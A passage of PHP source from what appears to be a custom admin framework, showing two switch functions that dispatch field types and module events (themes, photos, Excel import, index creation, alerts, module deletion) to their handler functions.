		case 'code10':return codeG($id,$opr,$filed,$val);break;
        case 'code6':return codeG($id,$opr,$filed,$val,6);break;
		case 'code10a':return codeG($id,$opr,$filed,$val,10,'a');break;
		case 'tabCols':return tabCols($id,$opr,$filed,$val);break;
		case 'cusColVal_In':return cusColVal($id,$opr,$filed,$val,1);break;
		case 'cusColVal_Out':return cusColVal($id,$opr,$filed,$val,2);break;
		case 'lk_tab':return lk_table($id,$opr,$filed,$val);break;
		case 'theme':return sel_theme($id,$opr,$filed,$val);break;
		case 'list1':return getLists_mods($id,$opr,$filed,$val);break;	
        case 'minutes':return minutes($id,$opr,$filed,$val);break;
		case 'helpOpr':return helpOpr($id,$opr,$filed,$val);break;
        case 'photo_v':return viewPhotos_i($id,1,150,150);break;
        case 'photo_size':return getFileSize($val);break;
        case 'progList':return progList($id,$opr,$filed,$val);break;
		/*------index---------*/
		case 'iTables':return index_getTables($id,$opr,$filed,$val);break;
		case 'tables_col':return index_getTable_cols($id,$opr,$filed,$val);break;
		/*-------excel-------*/
		case 'exc_empty':return getFieldsProp($id,$opr,$filed,$val,1);break;
		case 'exc_choose':return getFieldsProp($id,$opr,$filed,$val,2);break;
		/***************************************************************/
        case 'noti_set':return noti_set($id,$opr,$filed,$val);break;
        /***************************************************************/    
		default: return getCustomFiledIN($opr,$fun,$id,$val,$filed);break;
	}
}
function modEvents_m($fun,$id,$event_no){
	global $mod_data;
	switch ($fun){
		case 'lang':return langEvents($id,$event_no);break;
		case 'delMod':return delMod($id,1);break;
		case 'delMod2':return delMod($id,2);break;
		case 'file_change':return file_change_events($id,$event_no,1);break;
		case 'file_change2':return file_change_events($id,$event_no,2);break;
        case 'progEvnts':return progs_events($id,$event_no);break;
        
		case 'modGen1':return modGen($id,1);break;
		case 'modGen2':return modGen($id,2);break;
			
		case 'grnSysAlert':return gnrSysAlert($id,$event_no);break;
		case 'DelSysAlert':return delSysAlert($id,$event_no);break;
		case 'changeTheme':return changeTheme();break;
		case 'delHelp':return delHelp($id,$event_no);break;
		/******index*********/
		case 'index_create':return index_create($id,$event_no);break;
		/*****excel******/
		case 'exc_del':return Script("delProcessDo($id,'o')");break;		
		case 'exc_file_add':return fixFileAdd($id,$event_no);break;	
		/************************************************/
        
        /************************************************/
		default: return modEvents($fun,$id,$event_no);break;
	}
}?>